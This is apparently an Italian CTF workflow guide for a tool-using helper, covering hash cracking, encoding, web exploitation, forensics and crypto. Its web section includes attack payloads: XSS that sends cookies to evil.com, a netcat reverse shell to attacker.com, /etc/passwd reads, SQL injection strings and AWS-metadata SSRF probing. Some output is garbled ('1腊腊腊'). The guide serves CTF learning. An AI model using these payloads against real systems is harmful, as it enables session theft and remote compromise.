# CTF Writeup Helper - Workflow

## Analisi Tipica CTF

### Categoria 1: Hash Cracking

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                    HASH ANALYSIS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Identifica il tipo di hash
   → Lunghezza = tipo
   → Formato = charset

   # 32 caratteri = MD5
   /tool hash text="cracca" algorithm="md5"
   # Risultato: 1腊腊腊... → compara con hash dato

   # 64 caratteri = SHA256
   /tool hash text="password" algorithm="sha256"

   # 60 caratteri = bcrypt
   /tool hash text="password" algorithm="bcrypt"

2. Rainbow Table Check
   → Prova hash comuni

   Prompt: "Ho questo hash: 5f4dcc3b5aa765d61d8327deb882cf99
   - Calcola MD5 di: password, admin, test, root, welcome"

3. Bruteforce con Pattern
   → Prova combinazioni comuni

   Prompt: "Genera wordlist con:
   - Pattern: admin, root, user
   - Year: 2024
   - Common: true
   Poi calcola MD5 di ogni elemento"
```

---

### Categoria 2: Encoding Challenges

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                    ENCODING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Base64
   → Dati binari in ASCII
   → Spesso usato per exploit

   /tool encoding text="c3VjY2Vzcw==" action="base64_decode"
   /tool encoding text="success" action="base64_encode"

2. URL Encoding
   → XSS, injection
   → Double encoding bypass

   /tool encoding text="<script>alert(1)</script>" action="url_encode"
   /tool encoding text="%3Cscript%3Ealert%281%29%3C%2Fscript%3E" action="url_decode"

3. Hex Encoding
   → Shellcode,绕过
   → Network protocols

   /tool encoding text="\x41\x42\x43" action="hex_decode"
   /tool encoding text="ABC" action="hex_encode"

4. HTML Entities
   → XSS bypass WAF

   /tool encoding text="<img src=x onerror=alert(1)>" action="html_encode"
   /tool encoding text="&lt;script&amp;gt;" action="html_decode"

5. Unicode
   → IDN homograph attack
   → Normalization bypass

   /tool encoding text="ɑ" action="unicode_normalize_nfkd"

6. Multiple Encoding
   → Chain encoding

   Prompt: "Decode successivamente:
   1. Base64 → URL encode → Hex
   2. Prova: cz1hbnN3Mng="
```

---

### Categoria 3: Web Exploitation

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                    WEB CTF
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. SQL Injection
   → Identifica tipo DB
   → Blind vs Union

   # Test base
   /tool url_analyzer url="http://target.com/search?q=' OR 1=1--"

   # Error-based
   /tool encoding text="' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--" action="url_encode"

2. XSS
   → Cookie stealing
   → Keylogging

   # Payloads comuni
   /tool encoding text="<script>fetch('https://evil.com/?c='+document.cookie)</script>" action="html_encode"

   # Polyglot
   /tool encoding text="jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//\\x3e" action="url_encode"

3. Open Redirect
   → Phishing
   → SSRF chain

   /tool url_analyzer url="http://app.com/redirect?url=https://evil.com"
   /tool url_analyzer url="http://app.com/redirect?url=//evil.com"

4. SSRF
   → Metadata AWS
   → Port scanning interno

   /tool port_scanner host="169.254.169.254" ports="80,443,22" timeout=3000

5. Command Injection
   → RCE
   → Reverse shell

   /tool encoding text=";cat /etc/passwd" action="url_encode"
   /tool encoding text="| nc -e /bin/bash attacker.com 4444" action="url_encode"
```

---

### Categoria 4: Forensics

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                    FORENSICS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. File Analysis
   → Identifica tipo file
   → Magic bytes

   # Estrai hash
   /tool hash text="[contenuto file sconosciuto]" algorithm="sha256"

2. Password Protected Files
   → ZIP, RAR, PDF
   → Bruteforce con wordlist

   Prompt: "Genera wordlist per crack:
   - Lunghezza: 4-8
   - Pattern: CTF, ctf, flag, test
   - Numeri: 2024, 2023, 123"

3. Encrypted Strings
   → XOR
   → Rot13 / Caesar

   /tool encoding text="Uownt" action="rot13"

   # Per XOR custom, specifica la chiave

4. Steganography
   → Hidden data in immagini
   → Audio steganography

   # Estrai metadata
   # Usa browser tool per screenshot del QR code

5. Network Forensics
   → PCAP analysis
   → Reconstruct TCP streams

   /tool hash text="[stringa sospetta]" algorithm="md5"
   /tool hash text="[stringa sospetta]" algorithm="sha1"
```

---

### Categoria 5: Cryptography

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                    CRYPTO
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Hash Functions
   → MD5, SHA1, SHA256
   → Check plaintext

   /tool hash text=" plaintext" algorithm="[tipo]"

2. Encoding vs Encryption
   → Encoding = reversible, no key
   → Encryption = needs key

3. Common Patterns
   → Base64 → XOR → Base64
   → Hex → Caesar → Reverse

4. Password Generation for Bruteforce
   → Target specific wordlist

   Prompt: "Genera wordlist per challenge:
   - Nome challenge: crypto
   - Anno: 2024
   - Include: common CTF words: flag, secret, key, pass"
```

---

## Quick Reference - CTF One-liners

```bash
# Identifica hash velocemente
hash "string" MD5
hash "string" SHA256
hash "string" SHA512

# Decode rapido
encode "string" BASE64_DECODE
encode "string" URL_DECODE
encode "string" HEX_DECODE
encode "string" HTML_DECODE

# Encode per injection
encode "<script>" URL_ENCODE
encode "admin'--" SQL_ENCODE

# Password cracking
wordlist pattern="admin,root,flag" year=2024
password length=8 numbers=true

# Network recon
port_scanner target.com "22,80,443"
ssl_checker target.com 443
```

---

## CTF Challenge Templates

### Template 1: Hash Given, Find Plaintext

```
1. Identifica tipo hash (lunghezza)
2. Prova hash comuni:
   - "password"
   - "admin"
   - "flag{...}"
   - "ctf{...}"
3. Se non funziona → wordlist + bruteforce
```

### Template 2: Encoded Flag

```
1. Analizza encoding:
   - Base64 → try decode
   - Hex → try decode
   - URL → try decode
2. Chain decoding se necessario
3. Usa browser tool se output è QR/URL
```

### Template 3: Web Challenge

```
1. URL Analysis → cerca parametri
2. Testa XSS, SQLi, SSRF
3. Encoding per bypass WAF
4. Browser per test interattivi
```

### Template 4: Crypto Challenge

```
1. Hash what you see
2. Test encoding patterns
3. Bruteforce with wordlist
4. Check common keys
```

---

## Common CTF Flags Format

```
flag{...}
CTF{...}
pwned{...}
secret{...}
key{...}
```
